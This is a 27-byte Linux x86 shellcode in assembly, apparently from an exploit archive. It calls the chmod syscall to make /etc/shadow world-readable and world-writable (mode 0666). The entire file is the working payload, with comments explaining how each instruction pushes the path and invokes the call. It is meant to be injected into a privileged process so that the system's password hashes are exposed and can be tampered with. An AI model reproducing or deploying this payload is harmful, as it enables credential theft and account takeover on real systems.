; linux/x86 chmod 666 /etc/shadow 27 bytes
; root@thegibson
; 2010-01-15

section .text
	global _start

_start:
	; chmod("//etc/shadow", 0666);
	mov al, 15            ; syscall 15 -> chmod()
	cdq                   ; clean edx
	push edx              ; push edx
	push dword 0x776f6461 ; 'woda'
	push dword 0x68732f63 ; 'hs/c'
	push dword 0x74652f2f ; 'te//'
	mov ebx, esp          ; save pointer to ebx
	mov cx, 0666o         ; permission: 666
	int 0x80              ; syscall chmod()
